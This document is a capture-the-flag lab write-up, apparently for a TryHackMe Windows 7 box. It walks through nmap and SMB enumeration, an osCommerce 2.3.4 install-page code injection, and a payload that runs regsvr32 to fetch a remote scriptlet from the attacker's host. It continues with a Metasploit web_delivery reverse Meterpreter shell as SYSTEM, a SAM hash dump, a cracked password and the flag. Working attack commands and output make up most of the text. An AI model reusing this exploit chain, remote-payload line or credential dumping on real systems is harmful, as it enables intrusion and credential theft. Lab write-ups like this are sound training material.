IP:10.10.69.251

Nmap scan results:

root@LAPTOP-U5913CMD:/home/akshay/Desktop/blueprint# nmap -A -T4 10.10.69.251
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-13 19:11 IST
Nmap scan report for 10.10.69.251
Host is up (0.24s latency).
Not shown: 987 closed ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: 404 - File or directory not found.
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Bad request!
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Index of /
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS


root@LAPTOP-U5913CMD:/home/akshay/Desktop# smbclient -N -L \\\\10.10.69.251\\

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Users           Disk
        Windows         Disk
SMB1 disabled -- no workgroup available


root@LAPTOP-U5913CMD:/home/akshay/Desktop# smbclient //10.10.69.251/Users
Enter WORKGROUP\root's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Fri Apr 12 04:06:40 2019
  ..                                 DR        0  Fri Apr 12 04:06:40 2019
  Default                           DHR        0  Tue Jul 14 12:47:20 2009
  desktop.ini                       AHS      174  Tue Jul 14 10:11:57 2009
  Public                             DR        0  Tue Jul 14 10:11:57 2009

                7863807 blocks of size 4096. 4761263 blocks available
smb: \> ls -la
NT_STATUS_NO_SUCH_FILE listing \-la
smb: \> ls
  .                                  DR        0  Fri Apr 12 04:06:40 2019
  ..                                 DR        0  Fri Apr 12 04:06:40 2019
  Default                           DHR        0  Tue Jul 14 12:47:20 2009
  desktop.ini                       AHS      174  Tue Jul 14 10:11:57 2009
  Public                             DR        0  Tue Jul 14 10:11:57 2009
cd
                7863807 blocks of size 4096. 4761263 blocks available
smb: \> cd Default
smb: \Default\> ls


Seems like we can access Users file.
What can we do now lets see.

WE have got oscommerce exploit

http://10.10.69.251:8080/oscommerce-2.3.4/catalog/install/

Lets see if it gets exploited.


root@LAPTOP-U5913CMD:/home/akshay/Downloads# python 44374.py
[+] Successfully launched the exploit. Open the following URL to execute your code

http://blueprint.thm:8080//oscommerce-2.3.4/catalog/install/includes/configure.php
root@LAPTOP-U5913CMD:/home/akshay/Downloads#


Warning: Unterminated comment starting line 27 in C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes\configure.php on line 27
Volume in drive C has no label. Volume Serial Number is 14AF-C52C Directory of C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes 11/13/2020 03:27 PM
. 11/13/2020 03:27 PM
.. 04/11/2019 09:52 PM 447 application.php 11/13/2020 03:28 PM 1,118 configure.php 04/11/2019 09:52 PM
functions 2 File(s) 1,565 bytes 3 Dir(s) 19,504,197,632 bytes free

See its working.Lets get a reverse shell.

Warning: Unterminated comment starting line 27 in C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes\configure.php on line 27
Host Name: BLUEPRINT OS Name: Microsoft Windows 7 Home Basic OS Version: 6.1.7601 Service Pack 1 Build 7601 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Workstation OS Build Type: Multiprocessor Free Registered Owner: Windows User Registered Organization: Product ID: 00346-OEM-8992752-50005 Original Install Date: 1/15/2017, 6:48:59 AM System Boot Time: 11/13/2020, 3:23:02 PM System Manufacturer: Xen System Model: HVM domU System Type: X86-based PC Processor(s): 1 Processor(s) Installed. [01]: x64 Family 6 Model 63 Stepping 2 GenuineIntel ~2400 Mhz BIOS Version: Xen 4.2.amazon, 8/24/2006 Windows Directory: C:\Windows System Directory: C:\Windows\system32 Boot Device: \Device\HarddiskVolume1 System Locale: en-us;English (United States) Input Locale: en-us;English (United States) Time Zone: (UTC+00:00) Dublin, Edinburgh, Lisbon, London Total Physical Memory: 2,048 MB Available Physical Memory: 965 MB Virtual Memory: Max Size: 4,095 MB Virtual Memory: Available: 2,922 MB Virtual Memory: In Use: 1,173 MB Page File Location(s): C:\pagefile.sys Domain: WORKGROUP Logon Server: N/A Hotfix(s): 3 Hotfix(s) Installed. [01]: KB2534111 [02]: KB976902 [03]: KB4012215 Network Card(s): 1 NIC(s) Installed. [01]: Citrix PV Ethernet Adapter Connection Name: Local Area Connection 3 DHCP Enabled: Yes DHCP Server: 10.10.0.1 IP address(es) [01]: 10.10.5.73 [02]: fe80::9de8:8c8:825d:73bc

Change the contents of payload to:

# the payload will be injected into the configuration file via this code
# '  define(\'DB_DATABASE\', \'' . trim($HTTP_POST_VARS['DB_DATABASE']) . '\');' . "\n" .
# so the format for the exploit will be: '); PAYLOAD; /*

payload = '\');'
payload += 'system("regsvr32 /s /n /u /i:http://10.9.81.62:8080/eHDL3qPnhov.sct scrobj.dll");'    # this is where you enter you PHP payload
payload += '/*'

data['DB_DATABASE'] = payload

# exploit it
r = requests.post(url=target_url, data=data)

if r.status_code == 200:
    print("[+] Successfully launched the exploit. Open the following URL to execute your code\n\n" + base_url + "install/includes/configure.php")
else:
    print("[-] Exploit did not execute as planned")



msf6 exploit(multi/script/web_delivery) > set target 3
target => 3
msf6 exploit(multi/script/web_delivery) > options

Module options (exploit/multi/script/web_delivery):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)


Payload options (python/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.9.81.62       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   3   Regsvr32


msf6 exploit(multi/script/web_delivery) > run

[-] Exploit failed: python/meterpreter/reverse_tcp is not a compatible payload.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.9.81.62:4444
[*] Using URL: http://0.0.0.0:8080/eHDL3qPnhov
msf6 exploit(multi/script/web_delivery) > [*] Local IP: http://172.22.220.212:8080/eHDL3qPnhov
[*] Server started.
[*] Run the following command on the target machine:
regsvr32 /s /n /u /i:http://10.9.81.62:8080/eHDL3qPnhov.sct scrobj.dll
[*] 10.10.5.73       web_delivery - Handling .sct Request

msf6 exploit(multi/script/web_delivery) > sessions -t

Active sessions
===============

No active sessions.

msf6 exploit(multi/script/web_delivery) >
[*] 10.10.5.73       web_delivery - Handling .sct Request
[*] 10.10.5.73       web_delivery - Delivering Payload (1884 bytes)
[*] 10.10.5.73       web_delivery - Delivering Payload (1900 bytes)
[*] Sending stage (175174 bytes) to 10.10.5.73
[*] Meterpreter session 1 opened (10.9.81.62:4444 -> 10.10.5.73:49313) at 2020-11-13 21:11:27 +0530
[*] Sending stage (175174 bytes) to 10.10.5.73



meterpreter > sysinfo
Computer        : BLUEPRINT
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x86/windows
meterpreter > shell
Process 3196 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes>whoami
whoami
nt authority\system


Flags:

meterpreter > lsa_dump_sam
[+] Running as SYSTEM
[*] Dumping SAM
Domain : BLUEPRINT
SysKey : 147a48de4a9815d2aa479598592b086f
Local SID : S-1-5-21-3130159037-241736515-3168549210

SAMKey : 3700ddba8f7165462130a4441ef47500

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 549a1bcb88e35dc18c7a0b0168631411

RID  : 000001f5 (501)
User : Guest

RID  : 000003e8 (1000)
User : Lab
  Hash NTLM: 30e87bf999828446a1c1209ddde4c450


meterpreter >

Go to crackstation and crack the hash.
NTLM
30e87bf999828446a1c1209ddde4c450 - googleplus

1) "Lab" user NTML hash decrypted
-> googleplus


C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 14AF-C52C

 Directory of C:\Users\Administrator

04/11/2019  10:40 PM    <DIR>          .
04/11/2019  10:40 PM    <DIR>          ..
04/11/2019  10:36 PM    <DIR>          Contacts
11/27/2019  06:15 PM    <DIR>          Desktop
04/11/2019  10:36 PM    <DIR>          Documents
04/11/2019  10:45 PM    <DIR>          Downloads
04/11/2019  10:36 PM    <DIR>          Favorites
04/11/2019  10:36 PM    <DIR>          Links
04/11/2019  10:36 PM    <DIR>          Music
04/11/2019  10:36 PM    <DIR>          Pictures
04/11/2019  10:36 PM    <DIR>          Saved Games
04/11/2019  10:36 PM    <DIR>          Searches
04/11/2019  10:36 PM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)  19,506,073,600 bytes free

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 14AF-C52C

 Directory of C:\Users\Administrator\Desktop

11/27/2019  06:15 PM    <DIR>          .
11/27/2019  06:15 PM    <DIR>          ..
11/27/2019  06:15 PM                37 root.txt.txt
               1 File(s)             37 bytes
               2 Dir(s)  19,506,073,600 bytes free

C:\Users\Administrator\Desktop>type root.txt.txt
type root.txt.txt
THM{aea1e3ce6fe7f89e10cea833ae009bee}
C:\Users\Administrator\Desktop>

2) root.txt
-> THM{aea1e3ce6fe7f89e10cea833ae009bee}


Thank you... Happy Hacking :)
